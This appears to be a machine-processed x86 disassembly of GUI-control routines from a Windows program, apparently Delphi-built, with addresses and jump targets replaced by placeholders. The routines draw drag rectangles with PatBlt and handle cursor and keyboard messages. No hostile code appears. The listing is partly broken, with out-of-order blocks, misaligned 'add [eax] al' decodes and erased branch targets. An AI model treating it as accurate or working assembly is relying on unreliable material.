mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_440544
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403368
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403368
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_440608
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_440654
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_4406a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4407bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_42222c
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push r--data
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4407c2
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4407f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43f6f4
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403368
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403368
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403368
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403368
jmp r-xdata
sub_4408e4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416a38
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_440dcc
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43fb40
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43fb54
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_416a88
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_440ac4
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43f6c8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403368
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_446450
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d2c4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_440aaf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_446450
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_446450
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40316c
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43f550
test esi esi
je r-xdata
sub_440ac4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403368
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_441948
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403368
mov eax esi
call sub_43f5f8
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43f5b4
mov ecx eax
xor edx edx
xor eax eax
call sub_416a60
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403368
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_440b68
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_440b98
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_440c04
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_440cc4
sub_440c34
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_440c64
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43f6f4
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_440c90
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_440cc4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_440d98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_440dcc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_440e64
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_457570
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_457570
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43f750
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_460e14
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403368
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_4574b4
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403368
jmp r-xdata
sub_440ff8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408c5c
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408c88
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43f750
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408ab4
call sub_408a50
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408a50
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_4410a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_4410d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_441094
push ebp
call sub_4410a0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_441120
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_4411ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4411e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_440c64
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_457424
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403368
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_457424
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403368
sub_441268
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43f720
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43fde8
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_4411e4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_4412b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43f720
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4412d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43f720
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43fde8
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4411e4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403368
sub_441328
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_440c04
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_440b98
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_440c04
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_4413c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4411e4
pop esi
pop ebx
retn
sub_4413e9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4411e4
pop esi
pop ebx
retn
sub_44140f
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4411e4
pop esi
pop ebx
retn
sub_441439
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4411e4
pop esi
pop ebx
retn
sub_441464
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_441494
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_440c64
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_457424
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403368
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_457424
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403368
sub_44150c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_441544
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
